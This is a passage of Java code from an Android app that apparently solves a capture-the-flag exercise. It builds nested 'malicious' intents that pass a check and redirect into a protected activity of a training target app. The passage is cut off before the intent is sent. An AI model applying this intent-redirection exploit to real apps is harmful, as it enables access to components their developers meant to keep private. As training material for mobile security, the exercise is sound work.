...
public class flag5 extends AppCompatActivity {
    ...
    private void launchAttack() {
        // Create the innermost Intent with "reason" set to "back"
        Intent nextIntent = new Intent();
        nextIntent.putExtra("reason", "back");

        // Create maliciousIntent with "return" 42 and include nextIntent
        Intent maliciousIntent = new Intent();
        maliciousIntent.putExtra("return", 42); // Passes the initial check in Flag5Activity
        maliciousIntent.putExtra("nextIntent", nextIntent); // Provides the nextIntent for further processing

        // Create the exploit Intent targeting Flag5Activity
        Intent exploitIntent = new Intent();
        exploitIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");
        exploitIntent.putExtra("android.intent.extra.INTENT", maliciousIntent); // Embed maliciousIntent
